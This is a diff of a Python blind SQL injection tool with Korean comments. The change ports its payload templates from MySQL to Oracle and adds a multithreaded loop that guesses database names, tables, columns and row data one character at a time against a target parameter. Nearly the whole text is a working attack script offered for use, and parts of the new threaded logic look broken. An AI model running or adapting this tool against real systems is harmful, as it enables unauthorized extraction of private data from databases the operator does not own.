@@ -25,12 +25,12 @@ proxies = {
     "https": "http://127.0.0.1:8080",
 }
 
-# SQL Injection 페이로드 템플릿 설정 (MySQL DB용)
+# SQL Injection 페이로드 템플릿 설정 (오라클 DB용)
 payload_templates = {
-    "database_name": "1' AND (SELECT IFNULL((SELECT schema_name FROM information_schema.schemata LIMIT {index}, 1), '')) LIKE BINARY '{char}%' -- ",
-    "table_name": "1' AND (SELECT IFNULL((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index}, 1), '')) LIKE BINARY '{char}%' -- ",
-    "column_name": "1' AND (SELECT IFNULL((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index}, 1), '')) LIKE BINARY '{char}%' -- ",
-    "column_data": "1' AND (SELECT IFNULL((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), '')) LIKE BINARY '{char}%' -- "
+    "database_name": "1' AND SUBSTR((SELECT sys_context('userenv','instance_name') FROM dual), {i}, 1) = '{char}' -- ",
+    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rnum FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual)) WHERE rnum = {index}), {i}, 1) = '{char}' -- ",
+    "column_name": "1' AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rnum FROM all_tab_columns WHERE table_name = '{table_name}') WHERE rnum = {index}), {i}, 1) = '{char}' -- ",
+    "column_data": "1' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rnum FROM {table_name}) WHERE rnum = {index}), {i}, 1) = '{char}' -- "
 }
 
 # 참/거짓 판별 함수
@@ -46,46 +46,67 @@ def send_request(params):
     else:
         raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
 
-# 모든 데이터베이스 이름 추출 함수
-def get_all_database_names():
-    db_names = []
+# 데이터베이스 이름 추출 함수
+def get_database_name():
+    db_name = ""
     print("[정보] 데이터베이스 이름을 찾고 있습니다...")
-    for index in range(0, 101):  # 최대 100개 데이터베이스 가정
-        db_name = ""
-        for i in range(1, 50):  # 최대 길이 50자 가정
-            found_char = False
-            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["database_name"].format(index=index, char=db_name + char)
-                params = {param_name: payload}
-                response = send_request(params)
-                time.sleep(sleep_time)
+    threads = []
+    lock = threading.Lock()
+    queue = Queue()
 
-                if is_true_response(response):
+    def find_char():
+        nonlocal db_name
+        while not queue.empty():
+            i, char = queue.get()
+            payload = payload_templates["database_name"].format(i=i, char=char)
+            params = {param_name: payload}
+            response = send_request(params)
+            time.sleep(sleep_time)
+            if is_true_response(response):
+                with lock:
                     db_name += char
-                    found_char = True
                     print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
-                    break
-            if not found_char:
-                break
-        if db_name:
-            db_names.append(db_name)
-            print(f"[데이터베이스 발견] {index + 1}번째 데이터베이스 이름: {db_name}")
-        else:
-            break
-    print(tabulate([[d] for d in db_names] if db_names else [], headers=["Database Names"], tablefmt="grid"))
-    print(f"총 {len(db_names)}건")
-    return db_names
+                queue.queue.clear()  # 다른 문자 없이 다시 시작
+            queue.task_done()
 
-# 특정 데이터베이스의 테이블 이름 추출 함수
-def get_table_names(db_name, limit="ALL"):
+    for i in range(1, 50):  # 최대 길이 50자 가정
+        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+            queue.put((i, char))
+        threads.clear()
+        for _ in range(10):  # 아주 빠르게 10개 스레드 사용
+            thread = threading.Thread(target=find_char)
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+        if len(db_name) < i:
+            break
+
+    print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
+    print(f"총 1건" if db_name else "총 0건")
+    return db_name
+
+# 모든 테이블의 컬럼 추출 함수
+def get_all_columns():
+    tables = get_table_names()
+    all_columns = {}
+    for table in tables:
+        columns = get_column_names(table)
+        all_columns[table] = columns
+    return all_columns
+
+# 테이블 이름 추출 함수
+def get_table_names(limit="ALL"):
     tables = []
-    print(f"[정보] '{db_name}' 데이터베이스의 테이블 이름을 찾고 있습니다...")
-    for index in range(0, 101 if limit == "ALL" else int(limit)):  # 최대 100개 테이블 또는 사용자 지정 개수
+    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
+    for index in range(1, 101 if limit == "ALL" else int(limit) + 1):  # 최대 100개 테이블 또는 사용자 지정 개수
         table_name = ""
         for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
             found_char = False
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["table_name"].format(db_name=db_name, index=index, char=table_name + char)
+                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
@@ -99,23 +120,23 @@ def get_table_names(db_name, limit="ALL"):
                 break
         if table_name:
             tables.append(table_name)
-            print(f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
+            print(f"[테이블 발견] {index}번째 테이블 이름: {table_name}")
         else:
-            break
+            continue  # 테이블이 없으면 다음 인덱스로 계속 진행
     print(tabulate([[t] for t in tables] if tables else [], headers=["Table Names"], tablefmt="grid"))
     print(f"총 {len(tables)}건")
     return tables
 
-# 특정 데이터베이스의 테이블 컬럼 이름 추출 함수
-def get_column_names(db_name, table_name, limit="ALL"):
+# 컬럼 이름 추출 함수
+def get_column_names(table_name, limit="ALL"):
     columns = []
-    print(f"[정보] '{db_name}' 데이터베이스의 '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
-    for index in range(0, 101 if limit == "ALL" else int(limit)):  # 최대 100개 컬럼 또는 사용자 지정 개수
+    print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
+    for index in range(1, 101 if limit == "ALL" else int(limit) + 1):  # 최대 100개 컬럼 또는 사용자 지정 개수
         column_name = ""
         for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
             found_char = False
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["column_name"].format(table_name=table_name, index=index, char=column_name + char)
+                payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
@@ -129,7 +150,7 @@ def get_column_names(db_name, table_name, limit="ALL"):
                 break
         if column_name:
             columns.append(column_name)
-            print(f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
+            print(f"[컬럼 발견] {index}번째 컬럼 이름: {column_name}")
         else:
             break
     print(tabulate([[c] for c in columns] if columns else [], headers=["Column Names"], tablefmt="grid"))
@@ -141,12 +162,12 @@ def get_column_data(table_name, column_name, limit="ALL"):
     data = []
     print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")
 
-    for index in range(0, 101 if limit == "ALL" else int(limit)):  # 최대 100개 데이터 행 또는 사용자 지정 개수
+    for index in range(1, 101 if limit == "ALL" else int(limit) + 1):  # 최대 100개 데이터 행 또는 사용자 지정 개수
         row_data = ""
         for i in range(1, 50):  # 데이터 길이 최대 50자 가정
             found_char = False
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, char=row_data + char)
+                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
@@ -160,7 +181,7 @@ def get_column_data(table_name, column_name, limit="ALL"):
                 break
         if row_data:
             data.append(row_data)
-            print(f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
+            print(f"[데이터 발견] {index}번째 행 데이터: {row_data}")
         else:
             break
     print(tabulate([[d] for d in data] if data else [], headers=["Data"], tablefmt="grid"))
@@ -214,10 +235,10 @@ def main():
     global request_method
     while True:
         print("\n[옵션 선택]")
-        print("1. 모든 데이터베이스 추출")
-        print("2. 특정 데이터베이스의 테이블 추출")
-        print("3. 테이블 컬럼 추출")
-        print("4. 테이블 데이터 추출")
+        print("1. 데이터베이스 추출")
+        print("2. 테이블 추출")
+        print("3. 컬럼 추출")
+        print("4. 데이터 추출")
         print("5. 종료")
         choice = input("작업을 선택하세요: ")
 
@@ -228,24 +249,27 @@ def main():
                 continue
 
         if choice == "1":
-            db_names = get_all_database_names()
+            db_name = get_database_name()
         elif choice == "2":
-            db_name = input("테이블을 추출할 데이터베이스 이름을 입력하세요: ")
             limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            tables = get_table_names(db_name, limit)
+            tables = get_table_names(limit)
         elif choice == "3":
-            db_name = input("컬럼을 추출할 데이터베이스 이름을 입력하세요: ")
-            table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
-            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            columns = get_column_names(db_name, table_name, limit)
+            table_choice = input("1. 특정 테이블의 컬럼 추출\n2. 전체 테이블의 컬럼 추출\n선택하세요: ").strip()
+            if table_choice == "1":
+                table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
+                limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+                columns = get_column_names(table_name, limit)
+            elif table_choice == "2":
+                all_columns = get_all_columns()
+            else:
+                print("잘못된 선택입니다. 다시 입력하세요.")
         elif choice == "4":
-            db_name = input("데이터를 추출할 데이터베이스 이름을 입력하세요: ")
             table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
             column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ").strip().upper()
             limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
 
             if column_name == "ALL":
-                columns = get_column_names(db_name, table_name)
+                columns = get_column_names(table_name)
                 all_data = {column: get_column_data(table_name, column, limit) for column in columns}
                 max_length = max(len(v) for v in all_data.values())
                 for column in all_data:
